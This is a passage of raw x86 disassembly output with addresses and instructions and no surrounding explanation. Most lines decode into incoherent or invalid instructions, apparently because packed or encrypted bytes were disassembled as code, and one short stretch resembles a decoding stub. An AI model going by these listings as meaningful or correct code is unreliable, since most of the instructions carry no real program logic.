  40f330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f331:	add    BYTE PTR [esi],ch
  40f333:	cmp    BYTE PTR cs:[eax-0x6c],dl
  40f337:	pop    ebp
  40f338:	jp     0x40f2d3
  40f33a:	mov    eax,ds:0x592408ec
  40f33f:	cmp    eax,0xffedad9e
  40f344:	mov    WORD PTR [eax+0x438e11bd],cs
  40f34a:	jmp    0x96a3:0x5858693f
  40f351:	xchg   edx,eax
  40f352:	push   edi
  40f353:	inc    esp
  40f354:	lahf   
  40f355:	jo     0x40f3a7
  40f357:	mov    al,0xb2
  40f359:	mov    ch,0xa0
  40f35b:	xchg   esp,eax
  40f35c:	stos   DWORD PTR es:[edi],eax
  40f35d:	fdivp  st(1),st
  40f35f:	sbb    BYTE PTR [edx+esi*8],cl
  40f362:	dec    edi
  40f363:	jmp    0xcf1c2d59
  40f368:	call   0x69ba3292
  40f36d:	pusha  
  40f36e:	or     BYTE PTR [ebx],cl
  40f370:	(bad)  
  40f371:	jecxz  0x40f367
  40f373:	pop    esi
  40f374:	push   ebx
  40f375:	inc    esi
  40f376:	jecxz  0x40f38a
  40f378:	cmc    
  40f379:	inc    ebp
  40f37a:	mov    esi,0x6405207a
  40f37f:	xor    bh,cl
  40f381:	std    
  40f382:	dec    edx
  40f383:	inc    edi
  40f384:	(bad)  
  40f386:	cmp    bh,al
  40f388:	inc    eax
  40f389:	mov    esp,esp
  40f38b:	pop    bx
  40f38d:	mov    esi,0x37f9a151
  40f392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f393:	fnstsw WORD PTR ds:0xe179a1b
  40f399:	jae    0x40f34c
  40f39b:	xchg   esi,eax
  40f39c:	ror    BYTE PTR [eax-0x2abbe4e3],0x66
  40f3a3:	jae    0x40f35a
  40f3a5:	in     eax,0x44
  40f3a7:	dec    eax
  40f3a8:	in     eax,0x5
  40f3aa:	lahf   
  40f3ab:	jb     0x40f38f
  40f3ad:	and    dh,bh
  40f3af:	ret    
  40f3b0:	ss mov al,0x98
  40f3b3:	ins    BYTE PTR es:[edi],dx
  40f3b4:	adc    al,BYTE PTR [edi]
  40f3b6:	addr16 cmp al,0xef
  40f3b9:	xchg   BYTE PTR [eax],cl
  40f3bb:	in     al,0xec
  40f3bd:	cmp    ebx,DWORD PTR [eax]
  40f3bf:	jb     0x40f435
  40f3c1:	out    dx,al
  40f3c2:	pushf  
  40f3c3:	push   esi
  40f3c4:	mov    bl,0x14
  40f3c6:	sub    BYTE PTR [edx+ebp*1+0x11],ch
  40f3ca:	aam    0xb5
  40f3cc:	aas    
  40f3cd:	pop    ebx
  40f3ce:	fs scas eax,DWORD PTR es:[di]
  40f3d1:	jge    0x40f414
  40f3d3:	sbb    BYTE PTR fs:[edx+edx*4],al
  40f3d7:	frstor [edi+0x74]
  40f3da:	inc    edi
  40f3db:	add    cl,BYTE PTR [edx+0x78]
  40f3de:	cmp    ebx,DWORD PTR [ebx]
  40f3e0:	xchg   ebp,eax
  40f3e1:	sbb    edx,DWORD PTR [eax]
  40f3e3:	fnstsw WORD PTR [edi+edi*8-0x46]
  40f3e7:	dec    ebx
  40f3e8:	(bad)  
  40f3ea:	push   ecx
  40f3eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ec:	ins    BYTE PTR es:[edi],dx
  40f3ed:	mov    dl,0x65
  40f3ef:	sbb    ch,dl
  40f3f1:	sbb    cl,ah
  40f3f3:	push   edx
  40f3f4:	mov    esp,0xfd442c6a
  40f3f9:	inc    esi
  40f3fa:	aam    0xc5
  40f3fc:	dec    edi
  40f3fd:	inc    eax
  40f3fe:	(bad)  
  40f400:	jge    0x40f437
  40f402:	pop    eax
  40f403:	std    
  40f404:	jmp    0x5b26fa91
  40f409:	or     eax,0xa066bb12
  40f40e:	push   ss
  40f40f:	leave  
  40f410:	or     bh,BYTE PTR [ebx+eax*8-0x4]
  40f414:	sbb    ch,BYTE PTR [esi]
  40f416:	push   es
  40f417:	out    dx,al
  40f418:	in     eax,dx
  40f419:	cmp    BYTE PTR [esp+edi*8-0x33c41edc],bh
  40f420:	mov    bl,0x70
  40f422:	out    0xe6,eax
  40f424:	add    esi,ebp
  40f426:	call   0xdc98:0x836defc5
  40f42d:	lea    ebp,[eax]
  40f42f:	mov    ch,0xe1
  40f431:	je     0x40f3fb
  40f433:	int    0x7a
  40f435:	repnz xlat BYTE PTR ds:[ebx]
  40f437:	mov    edi,0x61a5aaa5
  40f43c:	push   cs
  40f43d:	aas    
  40f43e:	inc    edx
  40f43f:	dec    esp
  40f440:	pop    edi
  40f441:	sbb    BYTE PTR [esp+eiz*4+0x3b],bl
  40f445:	stc    
  40f446:	mov    gs,ebx
  40f448:	add    DWORD PTR [ecx-0x10],0x9387c404
  40f44f:	iret   
  40f450:	ja     0x40f4b4
  40f452:	out    dx,eax
  40f453:	(bad)  
  40f455:	push   es
  40f456:	jg     0x40f406
  40f458:	aad    0xcc
  40f45a:	call   esp
  40f45c:	(bad)  
  40f45d:	fsubr  DWORD PTR [esi+eax*8+0x40]
  40f461:	mov    ds:0x940f1fca,eax
  40f466:	lods   al,BYTE PTR ds:[esi]
  40f467:	imul   DWORD PTR [edx-0x80]
  40f46a:	nop
  40f46b:	psubusw mm4,QWORD PTR ds:0xb03076a8
  40f472:	push   ebp
  40f473:	sub    ebx,DWORD PTR [edi-0x64]
  40f476:	mov    ecx,0x7b236f92
  40f47b:	push   esi
  40f47c:	pop    edx
  40f47d:	xor    esp,DWORD PTR [ecx]
  40f47f:	icebp  
  40f480:	clc    
  40f481:	test   al,0x6d
  40f483:	and    DWORD PTR [esi+0x6e],ebp
  40f486:	pusha  
  40f487:	or     DWORD PTR [ebx],eax
  40f489:	pop    ss
  40f48a:	fs add al,0xe7
  40f48d:	mov    ?,edi
  40f48f:	retf   0xf058
  40f492:	sbb    eax,0x8b128b00
  40f497:	xor    eax,0x421ce2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ce2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	out    0xb5,eax
  40f4c6:	cmc    
  40f4c7:	ror    DWORD PTR [ebx-0x73],1
  40f4ca:	bound  esp,QWORD PTR [edx-0x15]
  40f4cd:	pop    edi
  40f4ce:	bound  esp,QWORD PTR [edx+0x2d]
  40f4d1:	jl     0x40f503
  40f4d3:	jae    0x40f4b8
  40f4d5:	cmp    al,0x7c
  40f4d7:	jb     0x40f553
  40f4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4da:	pop    es
  40f4db:	push   edx
  40f4dc:	rol    BYTE PTR ds:0xb5d24df5,0xc2
  40f4e3:	jmp    0x66df63d3
  40f4e8:	cld    
  40f4e9:	test   eax,0x955192e1
  40f4ee:	lea    eax,[edx]
  40f4f0:	dec    esp
  40f4f1:	dec    ebx
  40f4f2:	retf   
  40f4f3:	cmp    eax,0x336b51bc
  40f4f8:	shl    BYTE PTR [edx],1
  40f4fa:	ins    DWORD PTR es:[edi],dx
  40f4fb:	es hlt 
  40f4fd:	mov    DWORD PTR [esp+ebp*4],edi
  40f500:	xchg   ch,bh
  40f502:	outs   dx,BYTE PTR ss:[esi]
  40f504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f505:	lahf   
  40f506:	mov    DWORD PTR [edi+0x6eacb7a0],edx
  40f50c:	les    ebp,FWORD PTR [ecx-0x4beb5d77]
  40f512:	sbb    DWORD PTR [esi+0x2f],eax
  40f515:	jmp    0x9e563fa9
  40f51a:	les    ebx,FWORD PTR [edx-0x460858b9]
  40f520:	stc    
  40f521:	call   0xcc89:0xe227e7a0
  40f528:	inc    edx
  40f529:	mov    ah,0x3a
  40f52b:	test   DWORD PTR [eax+0xb6d4178],edx
  40f531:	jp     0x40f55a
  40f533:	ficom  WORD PTR [ebp-0xa]
  40f536:	and    eax,0xe93b4755
  40f53b:	xor    BYTE PTR ds:0x8476a0e8,0x9d
  40f542:	aas    
  40f543:	leave  
  40f544:	sub    BYTE PTR [ebx+0x3b],dh
  40f547:	jae    0x40f5bd
  40f549:	fiadd  WORD PTR [ebx]
  40f54b:	inc    esi
  40f54c:	or     edx,eax
  40f54e:	imul   ebp,edi,0x6ed481cc
  40f554:	pop    ds
  40f555:	dec    ebx
  40f556:	pushf  
  40f557:	or     eax,DWORD PTR [ebx-0x419d6e56]
  40f55d:	int    0xb6
  40f55f:	iret   
  40f560:	push   ecx
  40f561:	adc    DWORD PTR [ebp+esi*4-0x73c575a7],esi
  40f568:	mov    bh,0xef
  40f56a:	test   al,0x48
  40f56c:	cmp    eax,0xb75255ef
  40f571:	in     eax,dx
  40f572:	xchg   ebp,eax
  40f573:	aam    0x54
  40f575:	mov    cl,0x58
  40f577:	xor    eax,0xfc6595b9
  40f57c:	leave  
  40f57d:	jl     0x40f578
  40f57f:	sbb    ch,bl
  40f581:	jg     0x40f568
  40f583:	mov    edi,0xa84b0bc1
  40f588:	mov    ds:0x7f29c48d,eax
  40f58d:	out    dx,eax
  40f58e:	enter  0xe80f,0xc3
  40f592:	(bad)  
  40f593:	out    0xdb,al
  40f595:	sub    al,ch
  40f597:	nop
  40f598:	or     ah,BYTE PTR [ebp+0x462403be]
  40f59e:	pop    es
  40f59f:	pushf  
  40f5a0:	push   edi
  40f5a1:	push   ebx
  40f5a2:	pop    ecx
  40f5a3:	pop    ds
  40f5a4:	sbb    DWORD PTR [ecx],ebp
  40f5a6:	sub    ch,bl
  40f5a8:	mov    bh,0xb8
  40f5aa:	adc    esi,DWORD PTR [ebp+0x7b]
  40f5ad:	shl    DWORD PTR [ebx],cl
  40f5af:	out    dx,eax
  40f5b0:	data16 loope 0x40f5a9
  40f5b3:	test   BYTE PTR [eax+0x48],cl
  40f5b6:	mov    dh,0x7e
  40f5b8:	jns    0x40f59f
  40f5ba:	(bad)  
  40f5bb:	into   
  40f5bc:	xor    ebx,DWORD PTR [edx-0x1f]
  40f5bf:	sub    BYTE PTR [edx],ch
  40f5c1:	jle    0x40f640
  40f5c3:	sub    eax,0x4e4f669
  40f5c8:	int    0xf1
  40f5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5cb:	inc    esi
  40f5cc:	mov    edx,0xb62dc0e7
  40f5d1:	jle    0x40f642
  40f5d3:	jmp    0x80e4:0xad553c94
  40f5da:	test   eax,0xfc64d864
  40f5df:	dec    eax
  40f5e0:	pop    esp
  40f5e1:	jmp    0xdff5:0x528b3d31
  40f5e8:	sbb    BYTE PTR [ecx+0x4198bb42],0xcb
  40f5ef:	rol    BYTE PTR [ebp+0x502fddc8],1
  40f5f5:	jle    0x40f58c
  40f5f7:	push   eax
  40f5f8:	aam    0x7c
  40f5fa:	or     esi,DWORD PTR [eax-0x2c7b66e2]
  40f600:	(bad)  
  40f601:	leave  
  40f602:	(bad)  
  40f603:	int3   
  40f604:	cdq    
  40f605:	push   ss
  40f606:	mov    edx,0x9598db9a
  40f60b:	jecxz  0x40f637
  40f60d:	clc    
  40f60e:	mov    dl,0xcd
  40f610:	mov    cl,BYTE PTR [esi+eax*4-0x7]
  40f614:	cli    
  40f615:	outs   dx,DWORD PTR ds:[esi]
  40f616:	inc    ebx
  40f617:	repz cmp ebp,ebx
  40f61a:	jge    0x40f65e
  40f61c:	cmp    eax,0x34a751d0
  40f621:	fs (bad) 
  40f623:	scas   eax,DWORD PTR es:[edi]
  40f624:	arpl   WORD PTR [ebx],bp
  40f626:	jp     0x40f6a6
  40f628:	std    
  40f629:	lds    ebp,FWORD PTR [ebx-0x75]
  40f62c:	adc    DWORD PTR [ebx-0x6f],ecx
  40f62f:	or     dl,bl
  40f631:	jns    0x40f665
  40f633:	pop    esi
  40f634:	je     0x40f5e4
  40f636:	(bad)  
  40f637:	or     eax,0x70ca91ee
  40f63c:	inc    edx
  40f63d:	repnz sbb edx,eax
  40f640:	pop    esi
  40f641:	ret    
  40f642:	lock stos BYTE PTR es:[edi],al
  40f644:	das    
  40f645:	dec    ebp
  40f646:	push   ecx
  40f647:	stos   DWORD PTR es:[edi],eax
  40f648:	mov    bh,0xe8
  40f64a:	scas   al,BYTE PTR es:[edi]
  40f64b:	dec    ebp
  40f64c:	call   0x629e6622
  40f651:	inc    ecx
  40f652:	(bad)  [ebp-0x4d]
  40f655:	or     ebx,DWORD PTR [ebp-0x2b]
  40f658:	fld    TBYTE PTR [esi+edx*8-0x110d76fe]
  40f65f:	es jp  0x40f687
  40f662:	sbb    dl,bl
  40f664:	or     al,ch
  40f666:	not    ebx
  40f668:	icebp  
  40f669:	outs   dx,BYTE PTR ds:[esi]
  40f66a:	mov    bl,0x93
  40f66c:	ret    0x9c42
  40f66f:	pop    ds
  40f670:	mov    esp,0xf5f59a4b
  40f675:	mov    al,0xf3
  40f677:	inc    esp
  40f678:	jmp    0x40f6e0
  40f67a:	push   esi
  40f67b:	dec    edx
  40f67c:	shl    DWORD PTR [edi+ecx*2],cl
  40f67f:	jb     0x40f617
  40f681:	push   ebp
  40f682:	fsubr  DWORD PTR [esi+edi*1]
  40f685:	jno    0x40f609
  40f687:	push   edx
  40f688:	sahf   
  40f689:	cmp    eax,0x55427928
  40f68e:	push   cs
  40f68f:	pop    eax
  40f690:	fs sub ah,0xa
  40f694:	pusha  
  40f695:	mov    ds:0xf2e801d4,al
  40f69a:	jge    0x40f6bb
  40f69c:	inc    esi
  40f69d:	aad    0x43
  40f69f:	fstp   QWORD PTR [esi+0x24470df9]
  40f6a5:	xchg   esp,eax
  40f6a6:	add    esi,eax
  40f6a8:	repz xchg ebp,eax
  40f6aa:	mov    ds:0x60aa6700,eax
  40f6af:	mov    edi,0xcb6ae8df
  40f6b4:	pusha  
  40f6b5:	stos   BYTE PTR es:[edi],al
  40f6b6:	lds    ebp,FWORD PTR ds:0x6e50333c
  40f6bc:	scas   al,BYTE PTR es:[edi]
  40f6bd:	add    al,0xb4
  40f6bf:	and    bh,ch
  40f6c1:	inc    ebp
  40f6c2:	fstp   QWORD PTR [eax+0x90d9c0f]
  40f6c8:	adc    esp,DWORD PTR [ecx-0xcd72246]
  40f6ce:	add    DWORD PTR [ecx-0x3502cd0c],ebx
  40f6d4:	mov    ch,0x82
  40f6d6:	dec    edx
  40f6d7:	mov    ebx,0x82648204
  40f6dc:	mov    esp,DWORD PTR [ecx-0x61eb3ea0]
  40f6e2:	or     ch,cl
  40f6e4:	hlt    
  40f6e5:	into   
  40f6e6:	leave  
  40f6e7:	jge    0x40f692
  40f6e9:	int    0x2c
  40f6eb:	mov    eax,ds:0x7bd745d6
  40f6f0:	les    edi,FWORD PTR [edi]
  40f6f2:	ret    
  40f6f3:	push   ebp
  40f6f4:	or     al,0xf6
  40f6f6:	mov    bh,0xb0
  40f6f8:	pop    ds
  40f6f9:	dec    ebp
  40f6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fb:	outs   dx,DWORD PTR ds:[esi]
  40f6fc:	jl     0x40f744
  40f6fe:	sbb    ah,BYTE PTR [edi+ebx*8]
  40f701:	dec    ebx
  40f702:	and    dh,BYTE PTR [ebx-0x2e]
  40f705:	idiv   al
  40f707:	or     DWORD PTR [ecx],edi
  40f709:	sub    eax,DWORD PTR [eax]
  40f70b:	sub    BYTE PTR [esi+0x23],ch
  40f70e:	mov    cr6,edi
  40f711:	inc    esi
  40f712:	or     al,BYTE PTR [ecx]
  40f714:	iret   
  40f715:	jmp    0x3ac918a5
  40f71a:	xchg   DWORD PTR [ebx+ebx*2],ebp
  40f71d:	add    eax,DWORD PTR ds:0x2d0bf65a
  40f723:	mov    ebx,0x366abb9a
  40f728:	inc    edx
  40f729:	jno    0x40f788
  40f72b:	das    
  40f72c:	jecxz  0x40f6d5
  40f72e:	cmp    ebp,DWORD PTR [edi-0x55822e31]
  40f734:	stos   DWORD PTR es:[edi],eax
  40f735:	jne    0x40f6b8
  40f737:	pop    ss
  40f738:	pushf  
  40f739:	out    dx,eax
  40f73a:	int3   
  40f73b:	inc    esi
  40f73c:	mov    eax,ds:0x95398381
  40f741:	inc    esp
  40f742:	cmp    BYTE PTR [ecx],bh
  40f744:	jg     0x40f6ee
  40f746:	fsubp  st(3),st
  40f748:	(bad)
  40f74c:	fild   DWORD PTR [esi]
  40f74e:	lods   eax,DWORD PTR ds:[esi]
  40f74f:	xor    ebp,esp
  40f751:	cmp    al,0x44
  40f753:	mov    eax,0xe0e5494f
  40f758:	jbe    0x40f6e8
  40f75a:	cmp    al,BYTE PTR [ecx+0x79149f16]
  40f760:	mov    ah,0x3b
  40f762:	mov    esi,0xf1daf576
  40f767:	fwait
  40f768:	mov    cl,0xa7
  40f76a:	aad    0x8c
  40f76c:	adc    ah,BYTE PTR [ecx-0x3b]
  40f76f:	push   ss
  40f770:	sub    edx,DWORD PTR [ecx+0x507492e7]
  40f776:	pop    ds
  40f777:	jecxz  0x40f7cc
  40f779:	out    dx,al
  40f77a:	leave  
  40f77b:	pop    ss
  40f77c:	pop    ss
  40f77d:	or     BYTE PTR [ecx+0x38348a5],dl
  40f783:	cmp    eax,0xa96f7e0
  40f788:	(bad)
  40f78c:	fmul   st(7),st
  40f78e:	jle    0x40f735
  40f790:	dec    esp
  40f791:	adc    BYTE PTR [esi+0x185cbf0d],al
  40f797:	xor    bl,ah
  40f799:	out    dx,eax
  40f79a:	enter  0xaea2,0xb2
  40f79e:	je     0x40f812
  40f7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7a1:	sar    BYTE PTR [edx],cl
  40f7a3:	cmp    DWORD PTR [ecx+0x861049e],0x250fdc3e
  40f7ad:	pop    ebp
  40f7ae:	push   ebp
  40f7af:	and    ch,BYTE PTR [eax+eax*2]
  40f7b2:	dec    ebx
  40f7b3:	imul   esi,DWORD PTR [edi-0x248fa55d],0xffffffe5
  40f7ba:	mov    ah,0x95
  40f7bc:	test   DWORD PTR [esi-0x741981e],ebx
  40f7c2:	cdq    
  40f7c3:	fldz   
  40f7c5:	leave  
  40f7c6:	sbb    DWORD PTR [ebx+ebp*8-0x12],eax
  40f7ca:	test   eax,0x3ee451fb
  40f7cf:	fldlg2 
  40f7d1:	xchg   ebx,eax
  40f7d2:	or     bh,BYTE PTR [edx+0x79]
  40f7d5:	repnz int 0x61
  40f7d8:	lock xchg DWORD PTR [eax*1-0x710553b9],esp
  40f7e0:	add    eax,0xf1681f6e
  40f7e5:	js     0x40f7c8
  40f7e7:	adc    ebp,eax
  40f7e9:	and    al,0xbd
  40f7eb:	mov    ah,0x6f
  40f7ed:	inc    eax
  40f7ee:	jmp    0xe673c7e9
  40f7f3:	jne    0x40f7d2
  40f7f5:	mov    WORD PTR ds:[eax-0x9],?
  40f7f9:	push   0x69eeb46a
  40f7fe:	fnstsw WORD PTR [ecx+0x3792d62a]
  40f804:	xchg   ebp,eax
  40f805:	sar    BYTE PTR [esp+ebp*2-0x48],0xcc
  40f80a:	sbb    al,ah
  40f80c:	pop    eax
  40f80d:	inc    esp
  40f80e:	(bad)  
  40f80f:	ds pushf 
  40f811:	scas   al,BYTE PTR es:[edi]
  40f812:	pushf  
  40f813:	mov    esp,0x11788ddc
  40f818:	sbb    al,0xf2
  40f81a:	in     al,dx
  40f81b:	mov    cl,0x33
  40f81d:	jg     0x40f888
  40f81f:	loope  0x40f87c
  40f821:	in     eax,0x51
  40f823:	lods   eax,DWORD PTR ds:[esi]
  40f824:	jp     0x40f7c4
  40f826:	mov    bh,0x9b
  40f828:	jmp    0x980d6865
  40f82d:	leave  
  40f82e:	cmp    dh,BYTE PTR [ebx-0xd]
  40f831:	fadd   QWORD PTR [esp+eax*4+0x340227bb]
  40f838:	cmc    
  40f839:	jmp    0x40f7df
  40f83b:	inc    ecx
  40f83c:	mov    DWORD PTR [ecx],esp
  40f83e:	jnp    0x40f8a0
  40f840:	fisubr WORD PTR [edi]
  40f842:	pusha  
  40f843:	pop    ds
  40f844:	in     eax,0x64
  40f846:	jbe    0x40f815
  40f848:	xor    dl,BYTE PTR [ecx-0x57539b0]
  40f84e:	jmp    0xc4c:0x49c13915
  40f855:	dec    eax
  40f856:	test   BYTE PTR [esi-0x28],bl
  40f859:	test   eax,0x1a83eee1
  40f85e:	call   0xff9f:0x3354ec45
  40f865:	(bad)  
  40f866:	mov    ecx,0xf3873d29
  40f86b:	in     eax,0x50
  40f86d:	xor    DWORD PTR [ebp-0x3d51c7c0],esp
  40f873:	mov    ds:0x15733776,eax
  40f878:	jns    0x40f8ae
  40f87a:	xor    bl,dl
  40f87c:	adc    edi,DWORD PTR [ecx+0x16]
  40f87f:	ins    DWORD PTR es:[edi],dx
  40f880:	pop    eax
  40f881:	add    DWORD PTR es:[edi+0x5d],ebx
  40f885:	out    0xe6,eax
  40f887:	push   0xffffffb4
  40f889:	scas   eax,DWORD PTR es:[edi]
  40f88a:	aad    0xc5
  40f88c:	adc    eax,0x8b636142
  40f891:	inc    edx
  40f892:	xor    al,0x20
  40f894:	pop    eax
  40f895:	nop
  40f896:	adc    ecx,DWORD PTR [esi-0x55]
  40f899:	mov    DWORD PTR [esi-0x6a1c4210],esp
  40f89f:	(bad)  
  40f8a0:	jmp    0x5add3957
  40f8a5:	ds dec eax
  40f8a7:	shl    edx,0x5
  40f8aa:	jg     0x40f8f9
  40f8ac:	loop   0x40f88f
  40f8ae:	mov    ch,0x42
  40f8b0:	and    edx,eax
  40f8b2:	pop    ecx
  40f8b3:	push   cs
  40f8b4:	fnstenv [edx+ebx*4]
  40f8b7:	fsubr  st,st(5)
  40f8b9:	adc    BYTE PTR [edx-0x1038e64a],0x7c
  40f8c0:	scas   al,BYTE PTR es:[edi]
  40f8c1:	outs   dx,DWORD PTR ds:[esi]
  40f8c2:	dec    edi
  40f8c3:	and    dh,BYTE PTR [ebx+0xd19e8b6]
  40f8c9:	imul   esi,DWORD PTR [edx+0x29],0xc00813dd
  40f8d0:	push   edi
  40f8d1:	push   ecx
  40f8d2:	stc    
  40f8d3:	inc    esi
  40f8d4:	jne    0x40f882
  40f8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d7:	lea    esi,[ebp-0x47]
  40f8da:	push   ebx
  40f8db:	lds    ebp,FWORD PTR ds:0x5fe51343
  40f8e1:	mov    edx,0xe6cf3b54
  40f8e6:	sub    eax,0x50f4bbe8
  40f8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ec:	xchg   ecx,eax
  40f8ed:	scas   al,BYTE PTR es:[edi]
  40f8ee:	or     edx,ebx
  40f8f0:	in     eax,dx
  40f8f1:	sub    eax,0x2ee74669
  40f8f6:	jae    0x40f885
  40f8f8:	div    BYTE PTR [edx+edi*2+0x305f6059]
  40f8ff:	dec    edx
  40f900:	call   0x385b3689
  40f905:	ret    
  40f906:	pop    ecx
  40f907:	fisttp DWORD PTR ds:[eax+0x3e]
  40f90b:	bound  eax,QWORD PTR [edi]
  40f90d:	and    ah,cl
  40f90f:	or     al,0x48
  40f911:	stos   DWORD PTR es:[edi],eax
  40f912:	mov    al,ds:0x7d1220af
  40f917:	lock ja 0x40f92d
  40f91a:	cmp    esi,esi
  40f91c:	xor    ebp,DWORD PTR [ebx]
  40f91e:	xchg   edx,eax
  40f91f:	mov    ds:0x605a6341,eax
  40f924:	and    DWORD PTR [eax+0x7e],eax
  40f927:	jp     0x40f9a8
  40f929:	push   eax
  40f92a:	out    0x33,al
  40f92c:	cdq    
  40f92d:	repnz scas al,BYTE PTR es:[edi]
  40f92f:	xlat   BYTE PTR ds:[ebx]
  40f930:	dec    edi
  40f931:	cmp    ebp,ebx
  40f933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f934:	sbb    bh,bl
  40f936:	pop    ecx
  40f937:	iret   
  40f938:	push   ss
  40f939:	sub    al,0x47
  40f93b:	push   ebp
  40f93c:	mov    cs,edi
  40f93e:	nop
  40f93f:	or     dh,BYTE PTR [edi+0x45]
  40f942:	jg     0x40f9a7
  40f944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f945:	or     ecx,esi
  40f947:	mov    ch,0xd8
  40f949:	or     bl,BYTE PTR [ebx]
  40f94b:	lea    eax,[ebx]
  40f94d:	lea    edx,[edi]
  40f94f:	push   ebp
  40f950:	sbb    al,0xbe
  40f952:	imul   ebx,eax,0x4e
  40f955:	xchg   ebx,eax
  40f956:	sub    eax,0x4692d1eb
  40f95b:	dec    ebp
  40f95c:	out    0x6f,al
  40f95e:	dec    edi
  40f95f:	in     al,0x32
  40f961:	fldcw  WORD PTR [edx]
  40f963:	test   esp,edx
  40f965:	test   al,0xef
  40f967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f968:	xchg   BYTE PTR [edi],dl
  40f96a:	xchg   BYTE PTR gs:[esi+0x1b5b44dd],dh
  40f971:	cwde   
  40f972:	or     ebx,ecx
  40f974:	sbb    esi,DWORD PTR [ebp-0x8cdc234]
  40f97a:	add    eax,0x551f7896
  40f97f:	push   ebp
  40f980:	jb     0x40f9f9
  40f982:	cmp    ah,bh
  40f984:	js     0x1bf0eb5c
  40f98a:	sti    
  40f98b:	cmp    eax,DWORD PTR [ebp+0xc]
  40f98e:	dec    esi
  40f98f:	test   eax,0xe4460e9e
  40f994:	lea    ebx,[ebp+0x17]
  40f997:	sbb    al,0xd7
  40f999:	push   edi
  40f99a:	enter  0x3d60,0x84
  40f99e:	push   ebx
  40f99f:	out    dx,eax
  40f9a0:	cwde   
  40f9a1:	gs pop edx
  40f9a3:	pop    ss
  40f9a4:	test   ecx,esi
  40f9a6:	ins    BYTE PTR es:[edi],dx
  40f9a7:	inc    ebp
  40f9a8:	mov    bl,0xd0
  40f9aa:	adc    al,0xba
  40f9ac:	or     eax,0x3457313d
  40f9b1:	xor    eax,0x47a039f4
  40f9b6:	sti    
  40f9b7:	popa   
  40f9b8:	mov    ch,0x2b
  40f9ba:	cmc    
  40f9bb:	lock dec ecx
  40f9bd:	into   
  40f9be:	sbb    BYTE PTR [eax],al
  40f9c0:	out    0xec,eax
  40f9c2:	dec    edi
  40f9c3:	lea    ecx,[ebx+0x4e]
  40f9c6:	outs   dx,BYTE PTR ds:[esi]
  40f9c7:	xchg   esp,eax
  40f9c8:	sbb    eax,0x5c32d2b2
  40f9cd:	dec    edi
  40f9ce:	inc    esi
  40f9cf:	sub    eax,0xcedb73a4
  40f9d4:	jb     0x40f9cb
  40f9d6:	mov    ebx,DWORD PTR [eax+0x1283d799]
  40f9dc:	bound  esi,QWORD PTR [edx-0x66115ffc]
  40f9e2:	adc    edx,edx
  40f9e4:	add    DWORD PTR [ebp+0x9],esi
  40f9e7:	(bad)  
  40f9e8:	sbb    bh,BYTE PTR [eax+ecx*2-0x3b]
  40f9ec:	adc    DWORD PTR [edi-0x75],ecx
  40f9ef:	mov    dh,0x5c
  40f9f1:	cmp    eax,0xb2f6c37c
  40f9f6:	aam    0xa8
  40f9f8:	jo     0x40f9ff
  40f9fa:	(bad)  
  40f9fc:	push   esi
  40f9fd:	xchg   esi,edx
  40f9ff:	mov    dl,al
  40fa01:	inc    eax
  40fa02:	ins    DWORD PTR es:[edi],dx
  40fa03:	rcr    DWORD PTR [ecx+ebx*4+0x19],1
  40fa07:	xchg   edi,eax
  40fa08:	pushf  
  40fa09:	fs xchg ebp,eax
  40fa0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa0d:	call   0x40d6d803
  40fa12:	push   0x2
  40fa14:	mov    ah,0x60
  40fa16:	jmp    0x774b:0x183015d
  40fa1d:	add    esi,DWORD PTR [edx-0x4234c906]
  40fa23:	pop    ds
  40fa24:	enter  0xcee4,0x1d
  40fa28:	mov    ch,0xa0
  40fa2a:	out    0xc8,eax
  40fa2c:	and    ebp,DWORD PTR ds:0xa17794ec
  40fa32:	push   ebx
  40fa33:	stc    
  40fa34:	jecxz  0x40faa1
  40fa36:	in     al,0x7e
  40fa38:	cmp    esi,edx
  40fa3a:	outs   dx,BYTE PTR ds:[esi]
  40fa3b:	repz (bad) 
  40fa3d:	int    0x65
  40fa3f:	xor    DWORD PTR [ebx+0x72],edi
  40fa42:	pusha  
  40fa43:	jecxz  0x40fa46
  40fa45:	pop    ebp
  40fa46:	xor    BYTE PTR [ebx-0x66],0xb9
  40fa4a:	in     eax,dx
  40fa4b:	or     dh,bh
  40fa4d:	mov    al,0x2f
  40fa4f:	add    ebx,DWORD PTR [edi+ebx*8]
  40fa52:	cli    
  40fa53:	sub    DWORD PTR [esi-0x211add06],0x74
  40fa5a:	inc    edi
  40fa5b:	xor    al,0xea
  40fa5d:	aaa    
  40fa5e:	pop    ebx
  40fa5f:	aad    0xbd
  40fa61:	or     BYTE PTR ds:0xe217268a,bl
  40fa67:	push   0x36
  40fa69:	mov    ebp,0xa98fa078
  40fa6e:	stos   DWORD PTR es:[edi],eax
  40fa6f:	(bad)  
  40fa71:	sbb    ah,BYTE PTR [ebx+0x5]
  40fa74:	push   edx
  40fa75:	mov    ds:0x92c30f55,eax
  40fa7a:	shr    ah,0x63
  40fa7d:	aaa    
  40fa7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa7f:	add    esi,DWORD PTR [edx]
  40fa81:	ss enter 0xb04e,0x19
